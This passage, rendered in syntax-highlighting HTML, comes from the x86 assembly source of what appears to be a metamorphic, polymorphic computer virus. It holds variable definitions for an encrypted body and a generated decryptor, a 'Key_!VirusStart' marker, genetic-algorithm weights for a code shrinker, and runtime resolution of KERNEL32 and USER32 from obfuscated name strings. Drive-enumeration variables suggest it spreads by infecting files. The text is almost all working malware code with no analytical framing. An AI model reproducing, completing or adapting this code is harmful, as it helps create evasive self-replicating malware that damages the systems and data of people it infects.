</span><span class="sc5">DecryptorPseudoCode</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03E0h</span><span class="sc0">
</span><span class="sc5">AssembledDecryptor</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03E8h</span><span class="sc0">
</span><span class="sc5">Decryptor_DATA_SECTION</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03F0h</span><span class="sc0">
</span><span class="sc5">SizeOfExpansion</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03F8h</span><span class="sc0">
</span><span class="sc5">SizeOfDecryptor</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0400h</span><span class="sc0">
</span><span class="sc5">TypeOfEncryption</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0408h</span><span class="sc0">
</span><span class="sc5">EncryptionKey</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0410h</span><span class="sc0">
</span><span class="sc5">IndexValue</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0418h</span><span class="sc0">
</span><span class="sc5">IndexRegister</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0420h</span><span class="sc0">
</span><span class="sc5">BufferRegister</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0428h</span><span class="sc0">
</span><span class="sc5">CounterRegister</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0430h</span><span class="sc0">
</span><span class="sc5">BufferValue</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0438h</span><span class="sc0">
</span><span class="sc5">CounterValue</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0440h</span><span class="sc0">
</span><span class="sc5">Poly_FirstPartOfFunction</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0448h</span><span class="sc0">
</span><span class="sc5">Poly_SecondPartOfFunction</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">   </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0450h</span><span class="sc0">
</span><span class="sc5">Poly_ThirdPartOfFunction</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0458h</span><span class="sc0">
</span><span class="sc5">AdditionToBuffer</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0460h</span><span class="sc0">
</span><span class="sc5">Poly_Jump_ErrorInVirtualAlloc</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">__DATA_SECTION</span><span class="sc4">+</span><span class="sc2">0468h</span><span class="sc0">
</span><span class="sc1">;Index2Register          EQU     __DATA_SECTION + 0470h</span><span class="sc0">
</span><span class="sc5">Poly_LoopLabel</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0478h</span><span class="sc0">
</span><span class="sc5">RVA_GetSystemTime</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0480h</span><span class="sc0">
</span><span class="sc5">RVA_GetTickCount</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0488h</span><span class="sc0">
</span><span class="sc5">RVA_GetDriveTypeA</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0490h</span><span class="sc0">
</span><span class="sc5">RVA_GetLogicalDriveStringsA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0498h</span><span class="sc0">
</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04A0h</span><span class="sc0">
</span><span class="sc5">StartOfEncryptedData</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04A8h</span><span class="sc0">
</span><span class="sc5">SizeOfNewCodeP2</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04B0h</span><span class="sc0">
</span><span class="sc5">Poly_InitialValue</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04B8h</span><span class="sc0">
</span><span class="sc5">Poly_Addition</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04C0h</span><span class="sc0">
</span><span class="sc5">Poly_ExcessJumpInstruction</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04C8h</span><span class="sc0">
</span><span class="sc5">DirectoryDeepness</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04D0h</span><span class="sc0">
</span><span class="sc5">RVA_GetSystemDefaultLCID</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04D8h</span><span class="sc0">
</span><span class="sc5">Poly_JumpRandomExecution</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04E0h</span><span class="sc0">
</span><span class="sc5">Weight_X000_3</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04E8h</span><span class="sc0">
</span><span class="sc5">Weight_X004_7</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04F0h</span><span class="sc0">
</span><span class="sc5">Weight_X008_11</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04F8h</span><span class="sc0">
</span><span class="sc5">Weight_X012_15</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0500h</span><span class="sc0">
</span><span class="sc5">Weight_X016_19</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0508h</span><span class="sc0">
</span><span class="sc5">Weight_X020_23</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0510h</span><span class="sc0">

</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; End of variables</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">


</span><span class="sc1">;; KEYWORD: Key_!VirusStart</span><span class="sc0">

</span><span class="sc5">Main</span><span class="sc0">            </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc1">; EBP = Delta offset</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">     </span><span class="sc1">; Return address</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FlagAorW</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Get if GetModuleHandle is A or W</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFFFEh</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DeltaRegister</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Get the delta register nr.</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetModuleHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RVA_GetProcAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03FFFFFh</span><span class="sc0">         </span><span class="sc1">; Eliminate the two highest bits</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CODE_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03FFFFFh</span><span class="sc0">         </span><span class="sc1">; "</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03FFFFFh</span><span class="sc0">         </span><span class="sc1">; "</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFERS_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_LABEL_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Construct the other</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">                </span><span class="sc1">; section addresses</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_VARIABLE_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER2_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_VAR_MARKS_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03FFFFFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DATA_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03FFFFFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DISASM2_SECTION</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc1">; Restore return value</span><span class="sc0">


</span><span class="sc1">;; Let's set the weights for the genetic algorithm. These are code structures</span><span class="sc0">
</span><span class="sc1">;; recognized by the shrinker.</span><span class="sc0">
</span><span class="sc1">;; The initial values of the weights are not arbitrary: they are the initial</span><span class="sc0">
</span><span class="sc1">;; values that simulate the random behaviour that was before the addition of</span><span class="sc0">
</span><span class="sc1">;; this type of algorithm.</span><span class="sc0">
</span><span class="sc1">;; These code structures are shrinked as</span><span class="sc0">
</span><span class="sc1">;;        SET_WEIGHT [ebp+Weight_X000_3],0,EAX,ECX</span><span class="sc0">
</span><span class="sc1">;;        SET_WEIGHT [ebp+Weight_X004_7],1,EAX,ECX</span><span class="sc0">
</span><span class="sc1">;; and so on.</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10808080h</span><span class="sc0">   </span><span class="sc1">; Weights 3,2,1 and 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X000_3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">


                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10808010h</span><span class="sc0">   </span><span class="sc1">; Weights 7,6,5,4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X004_7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80808055h</span><span class="sc0">   </span><span class="sc1">; Weights 11,10,9,8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X008_11</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80408080h</span><span class="sc0">   </span><span class="sc1">; Weights 15,14,13,12</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X012_15</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55404040h</span><span class="sc0">   </span><span class="sc1">; Weights 19,18,17,16</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X016_19</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F0808080h</span><span class="sc0">   </span><span class="sc1">; Weights 23,22,21,20</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Weight_X020_23</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;; Let's get the addresses of the APIs that we are going to use:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_BUFFER1_SECTION</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'nrek'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'23le'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'lld.'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Get the address of KERNEL32.DLL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APICall_GetModuleHandle</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Get the handle. If 0, we exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hKernel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">; APICALL_BEGIN</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'resu'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'d.23'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ll'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Get the address of USER32.DLL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">APICall_GetModuleHandle</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; APICALL_END</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ReturnValue</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; It doesn't matter if we</span><span class="sc0">
